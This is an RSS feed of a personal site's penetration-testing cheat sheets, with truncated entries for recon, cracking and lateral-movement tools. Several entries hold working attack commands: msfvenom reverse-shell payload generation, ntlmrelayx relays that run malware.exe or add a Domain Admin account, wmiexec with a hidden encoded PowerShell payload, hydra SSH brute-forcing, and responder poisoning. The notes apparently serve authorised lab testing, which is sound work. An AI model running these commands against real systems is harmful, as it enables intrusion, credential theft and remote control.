<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tools on My notes and snippets</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/</link><description>Recent content in Tools on My notes and snippets</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 10 Mar 2020 19:00:54 +0100</lastBuildDate><atom:link href="https://dev-hugo.justin-p.me/cheat-cheets/tools/index.xml" rel="self" type="application/rss+xml"/><item><title>whatweb</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/whatweb/</link><pubDate>Wed, 11 Mar 2020 16:20:49 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/whatweb/</guid><description>whatweb Installation Usage whatweb [options] &amp;lt;URLs&amp;gt; Flags TARGET SELECTION: &amp;lt;TARGETs&amp;gt; Enter URLs, hostnames, IP addresses, filenames or IP ranges in CIDR, x.x.x-x, or x.x.x.x-x.x.x.x format. --input-file=FILE, -i Read targets from a file. You can pipe hostnames or URLs directly with -i /dev/stdin. TARGET MODIFICATION: --url-prefix Add a prefix to target URLs. --url-suffix Add a suffix to target URLs. --url-pattern Insert the targets into a URL. Requires --input-file, eg. www.</description></item><item><title>Nmap</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/nmap/</link><pubDate>Wed, 11 Mar 2020 16:15:38 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/nmap/</guid><description>Nmap Installation apt install nmap Usage nmap [Scan Type(s)] [Options] {target specification} Flags TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL &amp;lt;inputfilename&amp;gt;: Input from list of hosts/networks -iR &amp;lt;num hosts&amp;gt;: Choose random targets --exclude &amp;lt;host1[,host2][,host3],...&amp;gt;: Exclude hosts/networks --excludefile &amp;lt;exclude_file&amp;gt;: Exclude list from file HOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers &amp;lt;serv1[,serv2],.</description></item><item><title>theHarvester</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/theharvester/</link><pubDate>Wed, 11 Mar 2020 15:28:04 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/theharvester/</guid><description>theHarvester Installation git clone https://github.com/laramies/theHarvester cd theHarvester python3 -m pip install -r requirements/base.txt python3 theHarvester.py -h Usage theHarvester -d [domain] -l [depth] -b [search engine name] Flags -d: Domain to search or company name -b: data source: baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all -s: start in result number X (default: 0) -v: verify host name via dns resolution and search for virtual hosts -f: save the results into an HTML and XML file (both) -n: perform a DNS reverse query on all ranges discovered -c: perform a DNS brute force for the domain name -t: perform a DNS TLD expansion discovery -e: use this DNS server -p: port scan the detected hosts and check for Takeovers (80,443,22,21,8080) -l: limit the number of results to work with(bing goes from 50 to 50 results, google 100 to 100, and pgp doesn't use this option) -h: use SHODAN database to query discovered hosts Examples Scan domain on google theHarvester -d justin-p.</description></item><item><title>amass</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/amass/</link><pubDate>Wed, 11 Mar 2020 15:22:08 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/amass/</guid><description>amass Installation Usage Flags Examples The most basic use of the tool for subdomain enumeration amass enum -d example.com Typical parameters for DNS enumeration amass enum -v -src -ip -brute -min-for-recursive 2 -d example.com Also see Github Documentation</description></item><item><title>PSDNSDumpsterAPI</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/psdnsdumpsterapi/</link><pubDate>Wed, 11 Mar 2020 15:16:39 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/psdnsdumpsterapi/</guid><description>PSDNSDumpsterAPI Installation Install-Module PSDNSDumpsterAPI Usage Invoke-PSDNSDumpsterAPI -Domain 'domain.tld' Flags .PARAMETER Domains One or more domains to get DNSDumpster results for. Examples Return the results from dnsdumpster as a PSObject $DomainInfo=Invoke-PSDnsDumpsterAPI -Domains 'justin-p.me' Also see Github</description></item><item><title>sublist3r</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/sublist3r/</link><pubDate>Wed, 11 Mar 2020 15:15:29 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/sublist3r/</guid><description>Sublist3r Installation Usage Flags Examples Enumerate subdomains of specific domain sublist3r -d example.com Show only subdomains which have ports 80 and 443 open sublist3r -d example.com -p 80,443 Save results in txt file sublist3r -d example.com -o ~/output/file.txt Also see Github</description></item><item><title>h8mail</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/h8mail/</link><pubDate>Wed, 11 Mar 2020 11:56:31 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/h8mail/</guid><description>h8mail h8mail is an email OSINT and breach hunting tool using different breach and reconnaissance services, or local breaches such as Troy Hunt&amp;rsquo;s &amp;ldquo;Collection1&amp;rdquo; and the infamous &amp;ldquo;Breach Compilation&amp;rdquo; torrent.
Installation pip3 install h8mail Usage usage: h8mail [-h] [-t USER_TARGETS [USER_TARGETS ...]] [-u USER_URLS [USER_URLS ...]] [-q USER_QUERY] [--loose] [-c CONFIG_FILE [CONFIG_FILE ...]] [-o OUTPUT_FILE] [-bc BC_PATH] [-sk] [-k CLI_APIKEYS [CLI_APIKEYS ...]] [-lb LOCAL_BREACH_SRC [LOCAL_BREACH_SRC ...]] [-gz LOCAL_GZIP_SRC [LOCAL_GZIP_SRC .</description></item><item><title>hash identifier</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/hash-identifier/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/hash-identifier/</guid><description>hash identifier hash-identifier HASH</description></item><item><title>hashcat</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/hashcat/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/hashcat/</guid><description>hashcat basic wordlist Attack NTLM hashes using wordlist, enable custom kernels (limits lenght of pass to 27, better speed), use workload 3 and save in cracked_hashes
hashcat -a 0 -m 1000 -O -w 3 hashfile wordlist -o cracked_hashes wordlist + rulelist hashcat -a 0 -m 1000 -O -w 3 hashfile wordlist -o cracked_hashes -r rule one-rule-to-rule-them-all https://www.notsosecure.com/one-rule-to-rule-them-all/
https://github.com/NotSoSecure/password_cracking_rules
bruteforcing predefined charsets ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?</description></item><item><title>msfvenom</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/msfvenom/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/msfvenom/</guid><description>msfvenom source
MSFVenom Payload Generation One-Liner Description msfvenom -l payloads List available payloads msfvenom -p PAYLOAD &amp;ndash;list-options List payload options msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP Payload Encoding msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf &amp;gt; shell.elf Linux Meterpreter reverse shell x86 multi stage msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf &amp;gt; shell.</description></item><item><title>ntlmrelayx</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/ntlmrelayx/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/ntlmrelayx/</guid><description>ntlmrelayx Relay to Workstations other Clients dump SAM ntlmrelayx.py -tf targets.txt -smb2support
interactive session ntlmrelayx.py -tf targets.txt -smb2support -i
Execute a file ntlmrelayx.py -tf targets.txt -smb2support -e malware.exe
Execute a command ntlmrelayx.py -tf targets.txt -smb2support -c &amp;quot;whoami&amp;quot;
Relay to AD with LDAP Basic command This command will:
dump LDAP information if credentials allow it add a Domain Admin account (user is added to Enterprise Admins group) setup a &amp;lsquo;domain user&amp;rsquo; account with ACL rights to preform a DCsync.</description></item><item><title>psexec</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/psexec/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/psexec/</guid><description>psexec MSFConsole exploit/windows/smb/psexec
PSExec.py psexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101
alternatives smbexec smbexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101
wmiexec Example 1 wmiexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101
Example 2 wmiexec.py lab.justin-p.me/dwalker@10.11.12.101 'powershell -exec bypass -Noninteractive -windowstyle hidden -e 'PAYLOAD' -hashes a:hash</description></item><item><title>responder</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/responder/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/responder/</guid><description>responder Basic usage run responder on eth0
responder -I eth0
Anaylise mode responder -I eth1 -A
Set and forget (silent for users) !!! likely break stuff on the network !!!
Verbose Enable answers for netbios wredir suffix queries. Enable answers for netbios domain suffix queries. Start the WPAD rogue proxy server. Fingerprint a host that issued an NBT-NS or LLMNR query. responder -I eth1 -rdwfv
Set and forget (interactive) !</description></item><item><title>Hydra</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/hydra/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/hydra/</guid><description>Hydra known username, password list root with passwordlist, null password, login as pass and reversed login as pass.
hydra -v -V -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr user list, password list userlist with passwordlist, null password, login as pass and reversed login as pass looped around users.
hydra -v -V -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr -u</description></item><item><title>mitm6</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/mitm6/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/mitm6/</guid><description>mitm6 Basic command Command below will send out IPv6 RA and catch DNS requests for lab.justin-p.me.
sudo mitm6 -i eth0 -d lab.justin-p.me</description></item><item><title>searchsploit</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/searchsploit/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/searchsploit/</guid><description>searchsploit Search searchsploit &amp;quot;Samba &amp;lt; 2.&amp;quot; show web url instead of local searchsploit -w &amp;quot;Samba &amp;lt; 2.&amp;quot; open exploit in editor searchsploit -x exploits/linux/remote/16321.rb copy exploit to current folder searchsploit -m exploits/linux/remote/16321.rb</description></item><item><title>nc</title><link>https://dev-hugo.justin-p.me/cheat-cheets/tools/nc/</link><pubDate>Tue, 10 Mar 2020 16:36:30 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheat-cheets/tools/nc/</guid><description>nc Usage nc OPTIONS HOST PORT Flags -4 Forces nc to use IPv4 addresses only. -6 Forces nc to use IPv6 addresses only. -b Allow broadcast. -C Send CRLF as line-ending. -D Enable debugging on the socket. -d Do not attempt to read from stdin. -h Prints out nc help. -I length Specifies the size of the TCP receive buffer. -i interval Specifies a delay time interval between lines of text sent and received.</description></item></channel></rss>